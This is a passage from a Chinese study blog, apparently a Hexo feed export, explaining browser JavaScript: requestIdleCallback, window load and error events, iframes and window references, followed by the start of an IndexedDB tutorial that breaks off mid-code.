<p>上面代码定义了一个网页动画，持续时间是2秒，会让元素向右移动。</p>
<h5 id="2-3-11-window-requestIdleCallback"><a href="#2-3-11-window-requestIdleCallback" class="headerlink" title="2.3.11 window.requestIdleCallback()"></a>2.3.11 window.requestIdleCallback()</h5><p><code>window.requestIdleCallback()</code>跟<code>setTimeout</code>类似，也是将某个函数推迟执行，但是它保证将回调函数推迟到系统资源空闲时执行。也就是说，如果某个任务不是很关键，就可以使用<code>window.requestIdleCallback()</code>将其推迟执行，以保证网页性能。</p>
<p>它跟<code>window.requestAnimationFrame()</code>的区别在于，后者指定回调函数在下一次浏览器重排时执行，问题在于下一次重排时，系统资源未必空闲，不一定能保证在16毫秒之内完成；<code>window.requestIdleCallback()</code>可以保证回调函数在系统资源空闲时执行。</p>
<p>该方法接受一个回调函数和一个配置对象作为参数。配置对象可以指定一个推迟执行的最长时间，如果过了这个时间，回调函数不管系统资源有无空闲，都会执行。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.requestIdleCallback(callback[, options])</span><br></pre></td></tr></table></figure>
<p><code>callback</code>参数是一个回调函数。该回调函数执行时，系统会传入一个<code>IdleDeadline</code>对象作为参数。<code>IdleDeadline</code>对象有一个<code>didTimeout</code>属性（布尔值，表示是否为超时调用）和一个<code>timeRemaining()</code>方法（返回该空闲时段剩余的毫秒数）。</p>
<p><code>options</code>参数是一个配置对象，目前只有<code>timeout</code>一个属性，用来指定回调函数推迟执行的最大毫秒数。该参数可选。</p>
<p><code>window.requestIdleCallback()</code>方法返回一个整数。该整数可以传入<code>window.cancelIdleCallback()</code>取消回调函数。</p>
<p>下面是一个例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">requestIdleCallback(myNonEssentialWork);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">myNonEssentialWork</span>(<span class="params">deadline</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">while</span> (deadline.timeRemaining() &gt; <span class="number">0</span>) &#123;</span><br><span class="line">    doWorkIfNeeded();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>requestIdleCallback()</code>用来执行非关键任务<code>myNonEssentialWork</code>。该任务先确认本次空闲时段有剩余时间，然后才真正开始执行任务。</p>
<p>下面是指定<code>timeout</code>的例子。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">requestIdleCallback(processPendingAnalyticsEvents, &#123; <span class="attr">timeout</span>: <span class="number">2000</span> &#125;);</span><br></pre></td></tr></table></figure>
<p>上面代码指定，<code>processPendingAnalyticsEvents</code>必须在未来2秒之内执行。</p>
<p>如果由于超时导致回调函数执行，则<code>deadline.timeRemaining()</code>返回<code>0</code>，<code>deadline.didTimeout</code>返回<code>true</code>。</p>
<p>如果多次执行<code>window.requestIdleCallback()</code>，指定多个回调函数，那么这些回调函数将排成一个队列，按照先进先出的顺序执行。</p>
<h4 id="2-4-事件"><a href="#2-4-事件" class="headerlink" title="2.4 事件"></a>2.4 事件</h4><p><code>window</code>对象可以接收以下事件。</p>
<h5 id="2-4-1-load-事件和-onload-属性"><a href="#2-4-1-load-事件和-onload-属性" class="headerlink" title="2.4.1 load 事件和 onload 属性"></a>2.4.1 load 事件和 onload 属性</h5><p><code>load</code>事件发生在文档在浏览器窗口加载完毕时。<code>window.onload</code>属性可以指定这个事件的回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onload = <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> elements = <span class="built_in">document</span>.getElementsByClassName(<span class="string">&#x27;example&#x27;</span>);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; elements.length; i++) &#123;</span><br><span class="line">    <span class="keyword">var</span> elt = elements[i];</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>上面代码在网页加载完毕后，获取指定元素并进行处理。</p>
<h5 id="2-4-2-error-事件和-onerror-属性"><a href="#2-4-2-error-事件和-onerror-属性" class="headerlink" title="2.4.2 error 事件和 onerror 属性"></a>2.4.2 error 事件和 onerror 属性</h5><p>浏览器脚本发生错误时，会触发<code>window</code>对象的<code>error</code>事件。我们可以通过<code>window.onerror</code>属性对该事件指定回调函数。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">message, filename, lineno, colno, error</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&quot;出错了！--&gt; %s&quot;</span>, error.stack);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>由于历史原因，<code>window</code>的<code>error</code>事件的回调函数不接受错误对象作为参数，而是一共可以接受五个参数，它们的含义依次如下。</p>
<ul>
<li>出错信息</li>
<li>出错脚本的网址</li>
<li>行号</li>
<li>列号</li>
<li>错误对象</li>
</ul>
<p>老式浏览器只支持前三个参数。</p>
<p>并不是所有的错误，都会触发 JavaScript 的<code>error</code>事件（即让 JavaScript 报错）。一般来说，只有 JavaScript 脚本的错误，才会触发这个事件，而像资源文件不存在之类的错误，都不会触发。</p>
<p>下面是一个例子，如果整个页面未捕获错误超过3个，就显示警告。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">msg, url, line</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (onerror.num++ &gt; onerror.max) &#123;</span><br><span class="line">    alert(<span class="string">&#x27;ERROR: &#x27;</span> + msg + <span class="string">&#x27;\n&#x27;</span> + url + <span class="string">&#x27;:&#x27;</span> + line);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">onerror.max = <span class="number">3</span>;</span><br><span class="line">onerror.num = <span class="number">0</span>;</span><br></pre></td></tr></table></figure>
<p>需要注意的是，如果脚本网址与网页网址不在同一个域（比如使用了 CDN），浏览器根本不会提供详细的出错信息，只会提示出错，错误类型是“Script error.”，行号为0，其他信息都没有。这是浏览器防止向外部脚本泄漏信息。一个解决方法是在脚本所在的服务器，设置<code>Access-Control-Allow-Origin</code>的 HTTP 头信息。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">Access-Control-Allow-Origin: *</span><br></pre></td></tr></table></figure>
<p>然后，在网页的<code>&lt;script&gt;</code>标签中设置<code>crossorigin</code>属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;script crossorigin=<span class="string">&quot;anonymous&quot;</span> src=<span class="string">&quot;//example.com/file.js&quot;</span>&gt;&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p>上面代码的<code>crossorigin=&quot;anonymous&quot;</code>表示，读取文件不需要身份信息，即不需要 cookie 和 HTTP 认证信息。如果设为<code>crossorigin=&quot;use-credentials&quot;</code>，就表示浏览器会上传 cookie 和 HTTP 认证信息，同时还需要服务器端打开 HTTP 头信息<code>Access-Control-Allow-Credentials</code>。</p>
<h5 id="2-4-3-window-对象的事件监听属性"><a href="#2-4-3-window-对象的事件监听属性" class="headerlink" title="2.4.3 window 对象的事件监听属性"></a>2.4.3 window 对象的事件监听属性</h5><p>除了具备元素节点都有的 GlobalEventHandlers 接口，<code>window</code>对象还具有以下的事件监听函数属性。<br><code>window.onafterprint</code>：<code>afterprint</code>事件的监听函数。<br><code>window.onbeforeprint</code>：<code>beforeprint</code>事件的监听函数。<br><code>window.onbeforeunload</code>：<code>beforeunload</code>事件的监听函数。<br><code>window.onhashchange</code>：<code>hashchange</code>事件的监听函数。<br><code>window.onlanguagechange</code>: <code>languagechange</code>的监听函数。<br><code>window.onmessage</code>：<code>message</code>事件的监听函数。<br><code>window.onmessageerror</code>：<code>MessageError</code>事件的监听函数。<br><code>window.onoffline</code>：<code>offline</code>事件的监听函数。<br><code>window.ononline</code>：<code>online</code>事件的监听函数。<br><code>window.onpagehide</code>：<code>pagehide</code>事件的监听函数。<br><code>window.onpageshow</code>：<code>pageshow</code>事件的监听函数。<br><code>window.onpopstate</code>：<code>popstate</code>事件的监听函数。<br><code>window.onstorage</code>：<code>storage</code>事件的监听函数。<br><code>window.onunhandledrejection</code>：未处理的 Promise 对象的<code>reject</code>事件的监听函数。<br><code>window.onunload</code>：<code>unload</code>事件的监听函数。</p>
<h4 id="2-5-多窗口操作"><a href="#2-5-多窗口操作" class="headerlink" title="2.5 多窗口操作"></a>2.5 多窗口操作</h4><p>由于网页可以使用<code>iframe</code>元素，嵌入其他网页，因此一个网页之中会形成多个窗口。如果子窗口之中又嵌入别的网页，就会形成多级窗口。</p>
<h5 id="2-5-1-窗口的引用"><a href="#2-5-1-窗口的引用" class="headerlink" title="2.5.1 窗口的引用"></a>2.5.1 窗口的引用</h5><p>各个窗口之中的脚本，可以引用其他窗口。浏览器提供了一些特殊变量，用来返回其他窗口。</p>
<ul>
<li><code>top</code>：顶层窗口，即最上层的那个窗口</li>
<li><code>parent</code>：父窗口</li>
<li><code>self</code>：当前窗口，即自身</li>
</ul>
<p>下面代码可以判断，当前窗口是否为顶层窗口。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.top === <span class="built_in">window</span>.self) &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是顶层窗口</span></span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是子窗口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>下面的代码让父窗口的访问历史后退一次。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="built_in">window</span>.parent.history.back();</span><br></pre></td></tr></table></figure>
<p>与这些变量对应，浏览器还提供一些特殊的窗口名，供<code>window.open()</code>方法、<code>&lt;a&gt;</code>标签、<code>&lt;form&gt;</code>标签等引用。</p>
<ul>
<li><code>_top</code>：顶层窗口</li>
<li><code>_parent</code>：父窗口</li>
<li><code>_blank</code>：新窗口</li>
</ul>
<p>下面代码就表示在顶层窗口打开链接。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;somepage.html&quot;</span> target=<span class="string">&quot;_top&quot;</span>&gt;Link&lt;/a&gt;</span><br></pre></td></tr></table></figure>
<h5 id="2-5-2-iframe-元素"><a href="#2-5-2-iframe-元素" class="headerlink" title="2.5.2 iframe 元素"></a>2.5.2 iframe 元素</h5><p>对于<code>iframe</code>嵌入的窗口，<code>document.getElementById</code>方法可以拿到该窗口的 DOM 节点，然后使用<code>contentWindow</code>属性获得<code>iframe</code>节点包含的<code>window</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> frame = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;theFrame&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> frameWindow = frame.contentWindow;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>frame.contentWindow</code>可以拿到子窗口的<code>window</code>对象。然后，在满足同源限制的情况下，可以读取子窗口内部的属性。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// 获取子窗口的标题</span></span><br><span class="line">frameWindow.title</span><br></pre></td></tr></table></figure>
<p><code>&lt;iframe&gt;</code>元素的<code>contentDocument</code>属性，可以拿到子窗口的<code>document</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> frame = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;theFrame&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> frameDoc = frame.contentDocument;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 等同于</span></span><br><span class="line"><span class="keyword">var</span> frameDoc = frame.contentWindow.document;</span><br></pre></td></tr></table></figure>
<p><code>&lt;iframe&gt;</code>元素遵守同源政策，只有当父窗口与子窗口在同一个域时，两者之间才可以用脚本通信，否则只有使用<code>window.postMessage</code>方法。</p>
<p><code>&lt;iframe&gt;</code>窗口内部，使用<code>window.parent</code>引用父窗口。如果当前页面没有父窗口，则<code>window.parent</code>属性返回自身。因此，可以通过<code>window.parent</code>是否等于window.self，判断当前窗口是否为iframe窗口。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="built_in">window</span>.parent !== <span class="built_in">window</span>.self) &#123;</span><br><span class="line">  <span class="comment">// 当前窗口是子窗口</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><code>&lt;iframe&gt;</code>窗口的<code>window</code>对象，有一个<code>frameElement</code>属性，返回<code>&lt;iframe&gt;</code>在父窗口中的 DOM 节点。对于非嵌入的窗口，该属性等于<code>null</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> f1Element = <span class="built_in">document</span>.getElementById(<span class="string">&#x27;f1&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> f1Window = f1Element.contentWindow;</span><br><span class="line"></span><br><span class="line">f1Window.frameElement === f1Element <span class="comment">// true</span></span><br><span class="line"><span class="built_in">window</span>.frameElement === <span class="literal">null</span> <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<h5 id="2-5-3-window-frames-属性"><a href="#2-5-3-window-frames-属性" class="headerlink" title="2.5.3 window.frames 属性"></a>2.5.3 window.frames 属性</h5><p><code>window.frames</code>属性返回一个类似数组的对象，成员是所有子窗口的<code>window</code>对象。可以使用这个属性，实现窗口之间的互相引用。比如，<code>frames[0]</code>返回第一个子窗口，<code>frames[1].frames[2]</code>返回第二个子窗口内部的第三个子窗口，<code>parent.frames[1]</code>返回父窗口的第二个子窗口。</p>
<p>注意，<code>window.frames</code>每个成员的值，是框架内的窗口（即框架的<code>window</code>对象），而不是<code>iframe</code>标签在父窗口的 DOM 节点。如果要获取每个框架内部的 DOM 树，需要使用<code>window.frames[0].document</code>的写法。</p>
<p>另外，如果<code>&lt;iframe&gt;</code>元素设置了<code>name</code>或<code>id</code>属性，那么属性值会自动成为全局变量，并且可以通过<code>window.frames</code>属性引用，返回子窗口的<code>window</code>对象。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// HTML 代码为 &lt;iframe id=&quot;myFrame&quot;&gt;</span></span><br><span class="line"><span class="built_in">window</span>.myFrame <span class="comment">// [HTMLIFrameElement]</span></span><br><span class="line">frames.myframe === myFrame <span class="comment">// true</span></span><br></pre></td></tr></table></figure>
<p>另外，<code>name</code>属性的值会自动成为子窗口的名称，可以用在<code>window.open</code>方法的第二个参数，或者<code>&lt;a&gt;</code>和<code>&lt;frame&gt;</code>标签的<code>target</code>属性。</p>
<p><code>Well,that&#39;s all for today</code></p>
]]></content>
      <categories>
        <category>JS</category>
      </categories>
      <tags>
        <tag>JS 浏览器模型-window 对象</tag>
      </tags>
  </entry>
  <entry>
    <title>打卡0069</title>
    <url>/2021/06/05/%E6%89%93%E5%8D%A10069/</url>
    <content><![CDATA[<p><font color=#412f1f>当你觉得孤独无助时，想一想还有十几亿细胞只为了你一个人而活。</font></p>
<h2 id="JS-浏览器模型"><a href="#JS-浏览器模型" class="headerlink" title="JS 浏览器模型"></a>JS 浏览器模型</h2><h3 id="14-IndexedDB-API"><a href="#14-IndexedDB-API" class="headerlink" title="14. IndexedDB API"></a>14. IndexedDB API</h3><h4 id="14-1-概述"><a href="#14-1-概述" class="headerlink" title="14.1 概述"></a>14.1 概述</h4><p>随着浏览器的功能不断增强，越来越多的网站开始考虑，将大量数据储存在客户端，这样可以减少从服务器获取数据，直接从本地获取数据。</p>
<p>现有的浏览器数据储存方案，都不适合储存大量数据：Cookie 的大小不超过 4KB，且每次请求都会发送回服务器；LocalStorage 在 2.5MB 到 10MB 之间（各家浏览器不同），而且不提供搜索功能，不能建立自定义的索引。所以，需要一种新的解决方案，这就是 IndexedDB 诞生的背景。</p>
<p>通俗地说，IndexedDB 就是浏览器提供的本地数据库，它可以被网页脚本创建和操作。IndexedDB 允许储存大量数据，提供查找接口，还能建立索引。这些都是 LocalStorage 所不具备的。就数据库类型而言，IndexedDB 不属于关系型数据库（不支持 SQL 查询语句），更接近 NoSQL 数据库。</p>
<span id="more"></span>
<p>IndexedDB 具有以下特点。<br><strong>（1）键值对储存。</strong> IndexedDB 内部采用对象仓库（object store）存放数据。所有类型的数据都可以直接存入，包括 JavaScript 对象。对象仓库中，数据以“键值对”的形式保存，每一个数据记录都有对应的主键，主键是独一无二的，不能有重复，否则会抛出一个错误。</p>
<p><strong>（2）异步。</strong> IndexedDB 操作时不会锁死浏览器，用户依然可以进行其他操作，这与 LocalStorage 形成对比，后者的操作是同步的。异步设计是为了防止大量数据的读写，拖慢网页的表现。</p>
<p><strong>（3）支持事务。</strong> IndexedDB 支持事务（transaction），这意味着一系列操作步骤之中，只要有一步失败，整个事务就都取消，数据库回滚到事务发生之前的状态，不存在只改写一部分数据的情况。</p>
<p><strong>（4）同源限制。</strong> IndexedDB 受到同源限制，每一个数据库对应创建它的域名。网页只能访问自身域名下的数据库，而不能访问跨域的数据库。</p>
<p><strong>（5）储存空间大。</strong> IndexedDB 的储存空间比 LocalStorage 大得多，一般来说不少于 250MB，甚至没有上限。</p>
<p><strong>（6）支持二进制储存。</strong> IndexedDB 不仅可以储存字符串，还可以储存二进制数据（ArrayBuffer 对象和 Blob 对象）。</p>
<h4 id="14-2-基本概念"><a href="#14-2-基本概念" class="headerlink" title="14.2 基本概念"></a>14.2 基本概念</h4><p>IndexedDB 是一个比较复杂的 API，涉及不少概念。它把不同的实体，抽象成一个个对象接口。学习这个 API，就是学习它的各种对象接口。</p>
<ul>
<li>数据库：IDBDatabase 对象</li>
<li>对象仓库：IDBObjectStore 对象</li>
<li>索引： IDBIndex 对象</li>
<li>事务： IDBTransaction 对象</li>
<li>操作请求：IDBRequest 对象</li>
<li>指针： IDBCursor 对象</li>
<li>主键集合：IDBKeyRange 对象</li>
</ul>
<p>下面是一些主要的概念。</p>
<h5 id="（1）数据库"><a href="#（1）数据库" class="headerlink" title="（1）数据库"></a>（1）数据库</h5><p>数据库是一系列相关数据的容器。每个域名（严格的说，是协议 + 域名 + 端口）都可以新建任意多个数据库。</p>
<p>IndexedDB 数据库有版本的概念。同一个时刻，只能有一个版本的数据库存在。如果要修改数据库结构（新增或删除表、索引或者主键），只能通过升级数据库版本完成。</p>
<h5 id="（2）对象仓库"><a href="#（2）对象仓库" class="headerlink" title="（2）对象仓库"></a>（2）对象仓库</h5><p>每个数据库包含若干个对象仓库（object store）。它类似于关系型数据库的表格。</p>
<h5 id="（3）数据记录"><a href="#（3）数据记录" class="headerlink" title="（3）数据记录"></a>（3）数据记录</h5><p>对象仓库保存的是数据记录。每条记录类似于关系型数据库的行，但是只有主键和数据体两部分。主键用来建立默认的索引，必须是不同的，否则会报错。主键可以是数据记录里面的一个属性，也可以指定为一个递增的整数编号。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">text</span>: <span class="string">&#x27;foo&#x27;</span> &#125;</span><br></pre></td></tr></table></figure>
<p>上面的对象中，<code>id</code>属性可以当作主键。</p>
<p>数据体可以是任意数据类型，不限于对象。</p>
<h5 id="（4）索引"><a href="#（4）索引" class="headerlink" title="（4）索引"></a>（4）索引</h5><p>为了加速数据的检索，可以在对象仓库里面，为不同的属性建立索引。</p>
<h5 id="（5）事务"><a href="#（5）事务" class="headerlink" title="（5）事务"></a>（5）事务</h5><p>数据记录的读写和删改，都要通过事务完成。事务对象提供<code>error</code>、<code>abort</code>和<code>complete</code>三个事件，用来监听操作结果。</p>
<h4 id="14-3-操作流程"><a href="#14-3-操作流程" class="headerlink" title="14.3 操作流程"></a>14.3 操作流程</h4><p>IndexedDB 数据库的各种操作，一般是按照下面的流程进行的。这个部分只给出简单的代码示例，用于快速上手，详细的各个对象的 API 放在后文介绍。</p>
<h5 id="14-3-1-打开数据库"><a href="#14-3-1-打开数据库" class="headerlink" title="14.3.1 打开数据库"></a>14.3.1 打开数据库</h5><p>使用 IndexedDB 的第一步是打开数据库，使用<code>indexedDB.open()</code>方法。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> request = <span class="built_in">window</span>.indexedDB.open(databaseName, version);</span><br></pre></td></tr></table></figure>
<p>这个方法接受两个参数，第一个参数是字符串，表示数据库的名字。如果指定的数据库不存在，就会新建数据库。第二个参数是整数，表示数据库的版本。如果省略，打开已有数据库时，默认为当前版本；新建数据库时，默认为<code>1</code>。</p>
<p><code>indexedDB.open()</code>方法返回一个 IDBRequest 对象。这个对象通过三种事件<code>error</code>、<code>success</code>、<code>upgradeneeded</code>，处理打开数据库的操作结果。</p>
<h6 id="（1）error-事件"><a href="#（1）error-事件" class="headerlink" title="（1）error 事件"></a>（1）error 事件</h6><p><code>error</code>事件表示打开数据库失败。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;数据库打开报错&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<h6 id="（2）success-事件"><a href="#（2）success-事件" class="headerlink" title="（2）success 事件"></a>（2）success 事件</h6><p><code>success</code>事件表示成功打开数据库。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = request.result;</span><br><span class="line">  <span class="built_in">console</span>.log(<span class="string">&#x27;数据库打开成功&#x27;</span>);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p>这时，通过<code>request</code>对象的<code>result</code>属性拿到数据库对象。</p>
<h6 id="（3）upgradeneeded-事件"><a href="#（3）upgradeneeded-事件" class="headerlink" title="（3）upgradeneeded 事件"></a>（3）upgradeneeded 事件</h6><p>如果指定的版本号，大于数据库的实际版本号，就会发生数据库升级事件<code>upgradeneeded</code>。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> db;</span><br><span class="line"></span><br><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>这时通过事件对象的<code>target.result</code>属性，拿到数据库实例。</p>
<h5 id="14-3-2-新建数据库"><a href="#14-3-2-新建数据库" class="headerlink" title="14.3.2 新建数据库"></a>14.3.2 新建数据库</h5><p>新建数据库与打开数据库是同一个操作。如果指定的数据库不存在，就会新建。不同之处在于，后续的操作主要在<code>upgradeneeded</code>事件的监听函数里面完成，因为这时版本从无到有，所以会触发这个事件。</p>
<p>通常，新建数据库以后，第一件事是新建对象仓库（即新建表）。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.createObjectStore(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，数据库新建成功以后，新增一张叫做<code>person</code>的表格，主键是<code>id</code>。</p>
<p>更好的写法是先判断一下，这张表格是否存在，如果不存在再新建。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  <span class="keyword">var</span> objectStore;</span><br><span class="line">  <span class="keyword">if</span> (!db.objectStoreNames.contains(<span class="string">&#x27;person&#x27;</span>)) &#123;</span><br><span class="line">    objectStore = db.createObjectStore(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>主键（key）是默认建立索引的属性。比如，数据记录是<code>&#123; id: 1, name: &#39;张三&#39; &#125;</code>，那么<code>id</code>属性可以作为主键。主键也可以指定为下一层对象的属性，比如<code>&#123; foo: &#123; bar: &#39;baz&#39; &#125; &#125;</code>的<code>foo.bar</code>也可以指定为主键。</p>
<p>如果数据记录里面没有合适作为主键的属性，那么可以让 IndexedDB 自动生成主键。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> objectStore = db.createObjectStore(</span><br><span class="line">  <span class="string">&#x27;person&#x27;</span>,</span><br><span class="line">  &#123; <span class="attr">autoIncrement</span>: <span class="literal">true</span> &#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure>
<p>上面代码中，指定主键为一个递增的整数。</p>
<p>新建对象仓库以后，下一步可以新建索引。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">request.onupgradeneeded = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">  db = event.target.result;</span><br><span class="line">  <span class="keyword">var</span> objectStore = db.createObjectStore(<span class="string">&#x27;person&#x27;</span>, &#123; <span class="attr">keyPath</span>: <span class="string">&#x27;id&#x27;</span> &#125;);</span><br><span class="line">  objectStore.createIndex(<span class="string">&#x27;name&#x27;</span>, <span class="string">&#x27;name&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">false</span> &#125;);</span><br><span class="line">  objectStore.createIndex(<span class="string">&#x27;email&#x27;</span>, <span class="string">&#x27;email&#x27;</span>, &#123; <span class="attr">unique</span>: <span class="literal">true</span> &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>上面代码中，<code>IDBObject.createIndex()</code>的三个参数分别为索引名称、索引所在的属性、配置对象（说明该属性是否包含重复的值）。</p>
<h5 id="14-3-3-新增数据"><a href="#14-3-3-新增数据" class="headerlink" title="14.3.3 新增数据"></a>14.3.3 新增数据</h5><p>新增数据指的是向对象仓库写入数据记录。这需要通过事务完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">add</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> request = db.transaction([<span class="string">&#x27;person&#x27;</span>], <span class="string">&#x27;readwrite&#x27;</span>)</span><br><span class="line">    .objectStore(<span class="string">&#x27;person&#x27;</span>)</span><br><span class="line">    .add(&#123; <span class="attr">id</span>: <span class="number">1</span>, <span class="attr">name</span>: <span class="string">&#x27;张三&#x27;</span>, <span class="attr">age</span>: <span class="number">24</span>, <span class="attr">email</span>: <span class="string">&#x27;zhangsan@example.com&#x27;</span> &#125;);</span><br><span class="line"></span><br><span class="line">  request.onsuccess = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;数据写入成功&#x27;</span>);</span><br><span class="line">  &#125;;</span><br><span class="line"></span><br><span class="line">  request.onerror = <span class="function"><span class="keyword">function</span> (<span class="params">event</span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">&#x27;数据写入失败&#x27;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">add();</span><br></pre></td></tr></table></figure>
<p>上面代码中，写入数据需要新建一个事务。新建时必须指定表格名称和操作模式（“只读”或“读写”）。新建事务以后，通过<code>IDBTransaction.objectStore(name)</code>方法，拿到 IDBObjectStore 对象，再通过表格对象的<code>add()</code>方法，向表格写入一条记录。</p>
<p>写入操作是一个异步操作，通过监听连接对象的<code>success</code>事件和<code>error</code>事件，了解是否写入成功。</p>
<h5 id="14-3-4-读取数据"><a href="#14-3-4-读取数据" class="headerlink" title="14.3.4 读取数据"></a>14.3.4 读取数据</h5><p>读取数据也是通过事务完成。</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">read</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">var</span> transaction = db.transaction([<span class="string">&#x27;person&#x27;</span>]);</span><br><span class="line">   <span class="keyword">var</span> objectStore = transaction.objectStore(<span class="string">&#x27;person&#x27;</span>);</span><br><span class="line">   <span class="keyword">var</span> request = objectStore.get(<span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">   request.onerror = <span class="function"><span class="keyword">function</span>(<span class="params">event</span>) </span>&#123;</span><br><span class="line">     <span class="built_in">console</span>.log(<span class="string">&#x27;事务失败&#x27;</span>);</span><br><span class="line">   &#125;;</span><br><span class="line"></span><br><span class="line">   request.onsuccess = <span class="function"><span class="keyword">function</span>(<span class="params"> event</span>) </span>&#123;</span><br><span class="line">      <span class="keyword">if</span> (request.result) &#123;</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;Name: &#x27;</span> + request.result.name);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;Age: &#x27;</span> + request.result.age);</span><br><span class="line">        <span class="built_in">console</span>.log(<span class="string">&#x27;Email: &#x27;</span> + request.result.email);</span><br><span class="line">      &#125; <span class="keyword">else</span> 